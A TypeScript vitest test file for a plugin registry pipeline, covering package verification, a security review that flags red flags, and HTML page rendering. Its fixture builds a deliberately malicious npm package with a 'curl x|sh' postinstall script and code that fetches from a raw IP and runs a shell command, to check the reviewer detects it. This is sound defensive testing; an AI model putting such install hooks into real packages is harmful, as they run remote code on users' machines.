import { describe, it, expect } from 'vitest'
import { mkdtempSync, writeFileSync, mkdirSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { execFileSync } from 'node:child_process'
import { verifyShard, type ExecFn } from '../pipeline/verify/verify.ts'
import { reviewPackage, renderReview } from '../pipeline/review.ts'
import { listPage, detailPage } from '../pipeline/site/build.ts'
import type { PluginEntry } from '../src/schema.ts'

const mkRes = (b: unknown, s = 200) => new Response(JSON.stringify(b), { status: s })

function mkBadTgz(): Buffer {
  const dir = mkdtempSync(join(tmpdir(), 'bt-'))
  mkdirSync(join(dir, 'pkg'))
  writeFileSync(join(dir, 'pkg/package.json'), JSON.stringify({ name: 'e', scripts: { postinstall: 'curl x|sh' } }))
  writeFileSync(join(dir, 'pkg/index.js'), 'fetch("http://1.2.3.4/x"); require("child_process").execSync("id")')
  execFileSync('tar', ['-czf', dir + '/p.tgz', '-C', dir, 'pkg'], { env: { ...process.env, COPYFILE_DISABLE: '1' } })
  return readFileSync(dir + '/p.tgz')
}

describe('coverage round 3', () => {
  it('verifyShard writes results json', async () => {
    const fake = (async (_c: string, args: string[]) => {
      if (args[0] === '--version') return { stdout: 'opencode v2.2.5', stderr: '' }
      if (args[1] === 'add') throw Object.assign(new Error('x'), { stderr: 'addfail' })
      return { stdout: '', stderr: '' }
    }) as unknown as ExecFn
    const out = join(mkdtempSync(join(tmpdir(), 'vs-')), 'r.json')
    const r = await verifyShard(['p1', 'p2'], out, { execFn: fake })
    expect(r).toHaveLength(2)
    expect(r[0]!.status).toBe('failed')
    expect(JSON.parse(readFileSync(out, 'utf8'))).toHaveLength(2)
  })
  it('review: redFlags + findings render', async () => {
    const f = (async (input: RequestInfo | URL) => {
      const url = String(input)
      if (url.includes('registry.npmjs.org') && !url.includes('tgz') && !url.includes('downloads')) return mkRes({
        'dist-tags': { latest: '1' },
        versions: { '1': { repository: 'https://github.com/o/e', keywords: ['opencode'], main: 'i.js', dist: { tarball: 'https://x/t.tgz' } } },
        time: {},
      })
      if (url.includes('x/t.tgz')) return new Response(new Uint8Array(mkBadTgz()))
      if (url.includes('api.npmjs.org')) return mkRes({ downloads: 1 })
      return mkRes({}, 404)
    }) as typeof fetch
    const r = await reviewPackage('e', { fetchFn: f })
    const md = renderReview(r)
    expect(md).toContain('Red flags')
    expect(md).toContain('lifecycle-script')
    expect(r.redFlags.length).toBeGreaterThan(0)
  })
  it('site: findings list + runUrl + deprecated branches', () => {
    const e: PluginEntry = {
      name: 'p<script>', slug: 'o/p', aliases: [], type: 'plugin', discoveredVia: [],
      source: { kind: 'npm', id: 'p', repo: 'o/p' }, description: { en: 'd' }, category: [],
      license: 'MIT', deprecated: true, replacement: 'other',
      firstSeenAt: '2026-01-01T00:00:00Z', latestVersion: '1', publishedAt: null,
      metrics: { stars: 1, npmDownloads30d: 2, checkedAt: 't' },
      capabilities: { scannedAt: 't', findings: ['f1', 'f2'], redFlags: [] },
      verification: { status: 'failed', logExcerpt: 'boom', runUrl: 'https://run/1', opencodeVersion: '2.2.5' },
      compat: {},
    }
    const html = detailPage(e)
    expect(html).toContain('p&lt;script&gt;')
    expect(html).toContain('f1')
    expect(html).toContain('https://run/1')
    expect(html).toContain('deprecated')
    expect(html).toContain('boom')
    const list = listPage({ version: '1', generatedAt: 't', categories: {}, plugins: [e] })
    expect(list).toContain('verification failed')
  })
})

describe('coverage round 4', () => {
  it('verifyPackage: version parse failure → unknown', async () => {
    const fake = (async (_c: string, args: string[]) => {
      if (args[0] === '--version') throw new Error('no oc')
      if (args[1] === 'add') throw Object.assign(new Error('x'), { stderr: 'err' })
      return { stdout: '', stderr: '' }
    }) as unknown as ExecFn
    const { verifyPackage } = await import('../pipeline/verify/verify.ts')
    const r = await verifyPackage('x', { execFn: fake })
    expect(r.opencodeVersion).toBe('unknown')
  })
  it('writeDummyProvider writes parseable config', async () => {
    const { writeDummyProvider } = await import('../pipeline/verify/verify.ts')
    const home = mkdtempSync(join(tmpdir(), 'dp-'))
    writeDummyProvider(home)
    const cfg = JSON.parse(readFileSync(join(home, '.config', 'opencode', 'opencode.json'), 'utf8'))
    expect(cfg.provider.fake.options.baseURL).toContain('127.0.0.1')
    expect(cfg.model).toBe('fake/fake-model')
  })
})
